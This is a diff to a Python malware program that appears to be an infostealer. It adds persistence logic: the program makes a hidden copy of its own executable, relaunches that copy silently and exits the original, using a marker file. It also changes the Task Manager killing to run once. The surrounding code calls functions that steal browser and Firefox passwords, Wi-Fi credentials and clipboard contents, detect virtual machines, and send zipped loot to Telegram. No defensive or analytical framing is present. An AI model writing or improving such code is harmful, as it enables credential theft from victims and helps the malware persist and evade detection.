@@ -336,6 +336,21 @@ def send_zip_to_telegram():
             errlog.write(str(e))
 
 
+import psutil
+
+def is_process_running(path):
+    for proc in psutil.process_iter(['exe']):
+        try:
+            if proc.info['exe'] and os.path.abspath(proc.info['exe']).lower() == os.path.abspath(path).lower():
+                return True
+        except:
+            continue
+    return False
+
+
+
+COPY_MARKER = os.path.join(EXTRACT_FOLDER, ".copied_marker")
+
 def ensure_hidden_copy():
     os.makedirs(EXTRACT_FOLDER, exist_ok=True)
     subprocess.call(f'attrib +h "{EXTRACT_FOLDER}"', shell=True)
@@ -344,13 +359,17 @@ def ensure_hidden_copy():
     dest_path = EXE_PATH
 
     if current_path.lower() != dest_path.lower():
-        if not os.path.exists(dest_path):
-            shutil.copy2(current_path, dest_path)
-            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
+        if not os.path.exists(COPY_MARKER):
+            if not os.path.exists(dest_path):
+                shutil.copy2(current_path, dest_path)
+                subprocess.call(f'attrib +h "{dest_path}"', shell=True)
 
-        # Start the copied version silently
-        subprocess.Popen(f'"{dest_path}"', shell=True)
-        os._exit(0)  # Kill original
+            with open(COPY_MARKER, "w") as f:
+                f.write("done")
+
+            subprocess.Popen(f'"{dest_path}"', shell=True)
+            os._exit(0)
+
 
 
 
@@ -604,7 +623,7 @@ def run():
                 f.write("Webcam detected.")
         extract_wifi()
         detect_vm()
-        kill_taskmgr()
+        kill_taskmgr_once()
         clipper()
         steal_browser()
         steal_firefox_passwords()
